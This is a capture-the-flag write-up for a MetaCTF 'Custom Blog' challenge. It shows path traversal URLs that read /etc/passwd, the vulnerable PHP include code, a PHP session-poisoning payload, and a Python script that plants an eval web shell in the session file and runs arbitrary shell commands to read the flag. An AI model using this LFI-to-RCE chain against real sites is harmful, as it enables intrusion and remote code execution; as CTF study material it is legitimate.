# Custom Blog

We got greeted with this challenge server http://host.cg21.metaproblems.com:4130/
which shows multiple blog entries which seems to be loaded as a file over include or require.

To test this we tried to include a familiar file from the host with path traversal.

```
http://host.cg21.metaproblems.com:4130/post.php?post=../etc/passwd
http://host.cg21.metaproblems.com:4130/post.php?post=../../etc/passwd
http://host.cg21.metaproblems.com:4130/post.php?post=../../../etc/passwd
http://host.cg21.metaproblems.com:4130/post.php?post=../../../../etc/passwd
```
And we found the content of the /etc/passwd file

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flag:x:999:999::/home/flag:/usr/sbin/nologin
```

That was quite easy, so we assumed that we can easily execute php code with the common practices.

So we tried:
```
http://host.cg21.metaproblems.com:4130/post.php?post=../../../../proc/self/environ
```

Which did not return anything, so we tried log poisoning but where unable to find or read anny meaningful log which we could influence.
We also knew that we could not abuse the wrapper due the prepending of the `posts/` in the post syntax. (Known from the source)

```php
<?php
  session_start();
  if (isset($_GET['post']) && file_exists($post = 'posts/' . $_GET['post'])) {
    $ok = true;
  } else {
    $ok = false;
    http_response_code(404);
  }
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= htmlentities($_GET['post']) ?></title>
    <link rel="stylesheet" href="/style.css">
    <?php include 'theme.php'; ?>
  </head>
  <body>
    <?php
      if ($ok) {
        echo '<h1>' . htmlentities($_GET['post']) . '</h1><hr><div class="post">';
        include $post;
        echo '</div>';
      } else {
        echo '<h1>post not found :(</h1><hr>';
      }
    ?>
    <a href="/">home</a>
  </body>
</html>
```

So we were pretty stuck until we noticed that there is a session available in which we can add data.
So we injected some php code in the `theme` session variable. That could be done over:
```
http://host.cg21.metaproblems.com:4130/set.php?theme=<?php phpinfo();?>
```

This session variable is saved in the user session, per default the php session handler is file based,
so we tried to locate the directory where they are located.
Its achievable because we know the schema which the file is created: `/xxx/xxx/sess_{SESSIONID}` the session id can be taken from the php session used from the client which fired the above request.
and the xxx directories need to be found.
We found our directory under /tmp/ so we went further to create a small exploit script which could run arbitary code:

```py
import base64

import requests


def stage_one():
    se = requests.session()
    se.get(
        "http://host.cg21.metaproblems.com:4130/set.php?theme=<?php set_time_limit(0);ini_set('max_execution_time', 0);error_reporting(E_ALL); print($_POST['code']);print(eval($_POST['code']));exit(); ?>")
    return se


def stage_two(s, cmd):
    sessionid = s.cookies.get("PHPSESSID")
    res = s.post(
        "http://host.cg21.metaproblems.com:4130/post.php?post=../../../../tmp/sess_" + sessionid,
        data={"code": "print(shell_exec(base64_decode('" + str(base64.b64encode(cmd.encode("utf-8")), "utf-8") + "')));"})
    print(res.content.decode())
    pass


s = stage_one()
stage_two(s, "ls -all")
```

Now where we can execute commands we can run any commands. We found setuid binary called /flag/flagreader by uploading linpeas to the server.

So we could just run

```py
stage_two(s, "/flag/flagreader")
```

And got the flag
```
MetaCTF{wh4t??lfi_1s_ev0lv1ng??}
```